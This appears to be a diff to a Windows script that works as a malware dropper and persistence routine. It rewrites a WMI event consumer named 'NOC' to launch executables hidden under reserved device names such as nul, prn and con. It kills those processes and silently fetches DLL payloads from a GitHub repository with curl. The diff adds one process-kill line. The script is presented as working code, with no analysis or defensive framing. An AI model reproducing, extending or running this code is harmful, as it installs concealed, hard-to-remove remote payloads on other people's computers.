@@ -11,6 +11,7 @@ powershell.exe -NoProfile -Command "$target = '\\?\%ProgramData%\prndata..\prn.e
 powershell.exe -NoProfile -Command "$target = '\\?\%ProgramData%\condata..\con.exe \\?\%ProgramData%\condata..\con'; $c = Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Filter \"Name='NOC'\"; if ($c -and $c.CommandLineTemplate -ne $target) { $c.CommandLineTemplate = $target; Set-CimInstance -InputObject $c }"
 
 taskkill.exe /f /IM nul.exe
+taskkill.exe /f /IM prn.exe
 taskkill.exe /f /IM con.exe
 dir "\\?\%ProgramData%\nuldata..\nul" >nul || curl.exe -s -L -o "\\?\%ProgramData%\nuldata..\nul" "https://github.com/vltex/1/raw/1/0/winfw.dll"
 dir "\\?\%ProgramData%\prndata..\prn" >nul || curl.exe -s -L -o "\\?\%ProgramData%\prndata..\prn" "https://github.com/vltex/1/raw/1/0/Icon.dll"
